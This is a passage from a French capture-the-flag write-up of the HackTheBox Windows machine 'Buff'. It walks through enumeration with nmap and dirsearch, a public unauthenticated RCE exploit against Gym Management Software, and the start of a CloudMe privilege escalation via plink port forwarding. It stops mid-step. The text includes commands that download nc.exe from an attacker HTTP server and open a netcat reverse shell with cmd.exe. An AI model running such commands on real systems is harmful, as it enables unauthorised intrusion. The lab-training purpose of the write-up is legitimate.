![Pic1](../img/buff1.PNG?raw=true) </br>

# Introduction

Buff est une machine Windows dont l'adresse IP est 10.10.10.198.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Enumération des fichiers et dossiers d'un site web.
* Identification d'un service vulnérable.
* Recherche et exécution d'un exploit (RCE).
* Passer d'un webshell à un reverse shell netcat.
* Elevation de privilège via l'exploitation d'un service local (forward de port)
</br>

# Enumération initiale
Nous commençons par l'énumération des services et ports de la box avec nmap :
```bash
$ nmap -T4 -A 10.10.10.194
```
![Pic2](../img/buff2.PNG?raw=true) </br>
Le port 8080 étant un serveur web, on peut faire une énumération des fichiers/dossiers présents sur le site :
```bash
$ dirsearch.py -u http://10.10.10.198:8080/ -e "php,txt" -f -t 200 -X 403,404 -w wordlist
```
![Pic3](../img/buff3.PNG?raw=true) </br>

# Obtenir un accès utilisateur
En se baladant sur le site, sur la page contact on peut voir :</br>
![Pic4](../img/buff4.PNG?raw=true) </br>
Nous recherchons alors un exploit pour Gym Management Software avec searchsploit :
```bash
$ searchsploit Gym Management
```
![Pic5](../img/buff5.PNG?raw=true) </br>
Nous allons alors exécuter l'exploit RCE non authentifié et récupérer le user.txt (on sera connecté en tant que Shaun) :
```bash
$ locate 48506.py
$ cp /usr/share/exploitdb/exploits/php/webapps/48506.py ./
$ python 48506.py 'http://10.10.10.198:8080/'
> type C:\Users\shaun\Desktop\user.txt
```
![Pic6](../img/buff6.PNG?raw=true) </br>

# Obtenir un accès administrateur
Tout d'abord, nous allons passer d'un webshell à un reverse shell. Pour ce faire, nous allons upload netcat sur la boxe
et établir une connection :
```bash
##### Sur l'attaquant
$ cp /usr/share/windows-binaries/nc.exe ./
$ python3 -m http.server &
$ nc -lvnp 1234
##### Sur la boxe
$ powershell Invoke-WebRequest -Uri http://10.10.14.34:8000/nc.exe -OutFile C:\Users\shaun\Downloads\nc.exe
$ C:\Users\shaun\Downloads\nc.exe 10.10.14.34 1234 -e cmd.exe
```
![Pic7](../img/buff7.PNG?raw=true) </br>
Maintenant nous pouvons passer à l'énumération de la box, dans le répertoire Downloads de shaun, il y a un exécutable cloudme :</br>
![Pic8](../img/buff8.PNG?raw=true) </br>
Un petit tour sur searchsploit nous permet de voir qu'il y a plusieurs exploits de dispo :
```bash
$ searchsploit cloudme
```
![Pic9](../img/buff9.PNG?raw=true) </br>
Nous allons tester le premier, mais avant il faut comprendre un minimum comment tout va se correler :
* Cloudme est un service de stockage.
* En lançant cloudme.exe, il va écouter sur le port 8888 de la box.
* Pour exécuter l'exploit, il faut faire un tunnel (un forward de port) entre la box et kali.
* Le forward de port de la box vers Kali se fera avec plink.
* On exécutera l'exploit sur notre machine kali sur un port qui redirigera le traffic vers la box.
</br>
Maintenant on passe à l'action, 1ère étape, executer CloudMe.exe et vérifier que la box écoute bien sur le 8888 :
```bash
#### Sur la box
> C:\Users\shaun\Downloads\CloudMe_1112.exe
> netstat -ano
```
![Pic10](../img/buff10.PNG?raw=true) </br>
Maintenant, nous allons faire le forward de port (je pars du principe qu'on a déjà transféré PLINK.exe sur la box) :
```bash
#### Sur la box
